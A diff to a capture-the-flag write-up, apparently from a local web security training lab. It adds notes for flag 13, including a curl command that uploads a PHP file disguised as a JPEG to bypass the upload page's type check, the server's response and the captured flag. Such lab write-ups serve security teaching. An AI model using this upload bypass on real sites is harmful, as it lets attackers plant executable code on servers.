@@ -545,7 +545,7 @@ Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c3954
 
 in http://localhost:8080/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README
 
-## FLAG 13 (WIP)
+## FLAG 13 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8 SERVER SIDE VALIDATION
 
 ADD IMAGE page
 
@@ -572,6 +572,26 @@ we get back
 
 ```
 /tmp/.jpg succesfully uploaded.
+```
+
+but that was not the vulnerability that we were supposed to find,
+
+this works though
+
+```
+➜  darklyProject git:(master) ✗ curl -X POST 'http://localhost:8080/index.php?page=upload#' \
+-H 'Content-Type: multipart/form-data' \
+-F 'uploaded=@test.php;type=image/jpeg' \
+-F 'MAX_FILE_SIZE=100000' \
+-F 'Upload=Upload'
+```
+
+basically just sending the POST request with a .php file but setting the type as jpeg
+
+and we get
+
+```
+>The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
 ```
 
 ### TO NOTE
